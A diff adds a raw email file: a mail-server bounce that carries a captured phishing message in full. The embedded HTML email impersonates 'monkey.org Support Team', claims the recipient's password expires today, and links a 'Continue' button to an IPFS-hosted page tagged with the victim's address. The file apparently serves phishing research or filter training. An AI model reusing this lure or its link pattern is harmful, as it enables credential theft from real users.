@@ -1,0 +1,120 @@
+Return-Path: MAILER-DAEMON
+Delivered-To: jose@monkey.org
+X-FDA: 81503518614.18.DE060C0
+Received: from server.mra-sb.com (server.mra-sb.com [137.59.110.49])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP id CE93812000D
+	for <jose@monkey.org>; Mon, 27 Nov 2023 11:31:25 +0000 (UTC)
+Authentication-Results: imf03.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf03.b.hostedemail.com: domain of server.mra-sb.com has no SPF policy when checking 137.59.110.49) smtp.helo=server.mra-sb.com;
+	dmarc=none
+Received: from mailnull by server.mra-sb.com with local (Exim 4.96.2)
+	id 1r7Zpi-00056u-23
+	for jose@monkey.org;
+	Mon, 27 Nov 2023 19:31:22 +0800
+X-Failed-Recipients: jose@monkey.org
+Auto-Submitted: auto-replied
+From: Mail Delivery System <Mailer-Daemon@server.mra-sb.com>
+To: jose@monkey.org
+References: <20231127123118.83F5474E1D14E2B0@monkey.org>
+Content-Type: multipart/report; report-type=delivery-status; boundary=1701084682-eximdsn-1798548802
+MIME-Version: 1.0
+Subject: Mail delivery failed: returning message to sender
+Message-Id: <E1r7Zpi-00056u-23@server.mra-sb.com>
+Date: Mon, 27 Nov 2023 19:31:22 +0800
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.mra-sb.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - 
+X-Get-Message-Sender-Via: server.mra-sb.com: sender_ident via received_protocol == local: mailnull/primary_hostname/system user
+X-Authenticated-Sender: server.mra-sb.com: mailnull
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: CE93812000D
+X-Stat-Signature: ykjd1gsf6k9acqxskuioewqiszn8m614
+X-Rspam-User: 
+X-Spam-Status: No, score=1.20
+X-HE-Tag: 1701084685-605043
+X-HE-Meta: U2FsdGVkX1/7MVH1Kz3t7bk+oHBUtZI5bHsrs8WO2JH1jLCKxvLL5bjgXkdZmupsFUcRp6lK6rRxNGbt6oRn2GwtaEQjgM6ddTQDgoc9Sw0Eeym+WCtY60ehujgXyf1IN7IXZ9kt67DahwSGL5IIJzeOwSGECWbwg73bcFqhzLqOxRiCPwhd8DZTjG9h70xYIPRG/OMt1Dj03tvxT27lGqi6CLizTqdIGYB7Otj7dkw=
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 382
+
+--1701084682-eximdsn-1798548802
+Content-type: text/plain; charset=us-ascii
+
+This message was created automatically by mail delivery software.
+
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
+
+  jose@monkey.org
+    Domain mra-sb.com has exceeded the max emails per hour (375/300 (125%)) allowed.  Message discarded.
+
+--1701084682-eximdsn-1798548802
+Content-type: message/delivery-status
+
+Reporting-MTA: dns; server.mra-sb.com
+
+Action: failed
+Final-Recipient: rfc822;jose@monkey.org
+Status: 5.0.0
+
+--1701084682-eximdsn-1798548802
+Content-type: message/rfc822
+
+Return-path: <jose@monkey.org>
+Received: from [45.138.16.85] (port=60967 helo=45.138.16.85.powered.by.rdp.sh)
+	by server.mra-sb.com with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96.2)
+	(envelope-from <jose@monkey.org>)
+	id 1r7Zpi-0004yT-25
+	for jose@monkey.org;
+	Mon, 27 Nov 2023 19:31:22 +0800
+From: monkey.org <jose@monkey.org>
+To: jose@monkey.org
+Subject: jose@monkey.org Password expires today
+Date: 27 Nov 2023 12:31:19 +0100
+Message-ID: <20231127123118.83F5474E1D14E2B0@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML>
+<HEAD>
+</HEAD>
+<BODY style=3D"MARGIN: .5em">
+<P>
+
+ID: jose@monkey.org<br><br>
+
+Your jose@monkey.org password expires today  11/27/2023 12:31:18 p.m.  <br>=
+<br>
+
+Use the button below to continue with same password<br><br>
+
+<p> <a href=3D'https://cloudflare-ipfs.com/ipfs/QmWNfGSYdmunLD6u7J4j3o9VqHW=
+sndBW8eYNmwNfeEvsj8/index2cha2611.html#jose@monkey.org' style=3D'padding: 1=
+5px; background: rgb(11, 102, 35) none repeat scroll 0% 50%; text-decoratio=
+n: none; width: 30%; display: block; text-align: center; -moz-background-cl=
+ip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inl=
+ine-policy: -moz-initial; color: white; font-size: 15px;' target=3D'_blank'=
+ > Continue </a></p>
+
+<p>Note: Your mails may not be delivered until you verify your account.</p>=
+
+<p>Sincerely,</p>
+<p>monkey.org Support Team.</p>
+</P>
+</BODY>
+</HTML>
+
+--1701084682-eximdsn-1798548802--
+
